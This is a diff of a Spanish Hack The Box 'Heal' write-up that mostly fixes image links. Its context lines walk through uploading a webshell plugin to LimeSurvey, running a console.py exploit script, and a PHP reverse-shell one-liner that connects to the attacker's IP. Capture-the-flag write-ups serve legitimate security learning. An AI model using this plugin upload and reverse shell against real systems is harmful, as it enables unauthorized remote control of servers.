@@ -214,19 +214,19 @@ Buscando por internet encontramos que tiene una vulnerabilidad de RCE, en el sig
 
 
 Clonamos el repositorio, dentro de este tenemos varias carpetas.
-Entra a la carpeta de `plugin` y comprime los dos archivos que se encuentran dentro( `webshell.php` y `config.xml` ) estos dos corresponden a la versión `6.x` lo cual funciona para mi, el zip que se genere ese tendrás que instalar en la página ![](file:///C:/Users/Santiantozac/AppData/Local/Packages/oice_16_974fa576_32c1d314_345e/AC/Temp/msohtmlclip1/01/clip_image002.gif) 
+Entra a la carpeta de `plugin` y comprime los dos archivos que se encuentran dentro( `webshell.php` y `config.xml` ) estos dos corresponden a la versión `6.x` lo cual funciona para mi, el zip que se genere ese tendrás que instalar en la página ![Pasted image](./Pasted%20image%2020250120232247.jpeg)
 
 En la página de Survey dirígete a `Configuration -> Plugins -> Upload & Install` y carga el .zip que anteriormente hicimos.
 
-![](file:///C:/Users/Santiantozac/AppData/Local/Packages/oice_16_974fa576_32c1d314_345e/AC/Temp/msohtmlclip1/01/clip_image004.gif)
+![Pasted image](./Pasted%20image%2020250120232300.jpeg)
 
 Si todo salió bien te saldrá lo siguiente `The plugin was succesfully installed`
 
-![](file:///C:/Users/Santiantozac/AppData/Local/Packages/oice_16_974fa576_32c1d314_345e/AC/Temp/msohtmlclip1/01/clip_image006.gif)
+![Pasted image](./Pasted%20image%2020250120232312.jpeg)
 
 Ahora bien para usar el exploit, lo buscaremos en el menú, aparece con el nombre de `WebShell` y daremos clic en el.
 
-![](file:///C:/Users/Santiantozac/AppData/Local/Packages/oice_16_974fa576_32c1d314_345e/AC/Temp/msohtmlclip1/01/clip_image008.gif)
+![Pasted image](./)
 
 Y ahora dentro del repositorio tenemos el script de `console.py` le daremos permisos de ejecución y lo ejecutaremos de la siguiente manera:
 
@@ -235,7 +235,7 @@ $ ./console -t http://take-survey.heal.htb
 ```
 
 Este script nos proporciona una `web shell` la cual usaremos para entablar una reverse Shell 
-![](file:///C:/Users/Santiantozac/AppData/Local/Packages/oice_16_974fa576_32c1d314_345e/AC/Temp/msohtmlclip1/01/clip_image010.gif)
+![Pasted image](./Pasted%20image%2020250120232247.jpeg)
 
 ```php
 php -r '$sock=fsockopen("10.10.16.78",443);shell_exec("sh <&3 >&3 2>&3");'
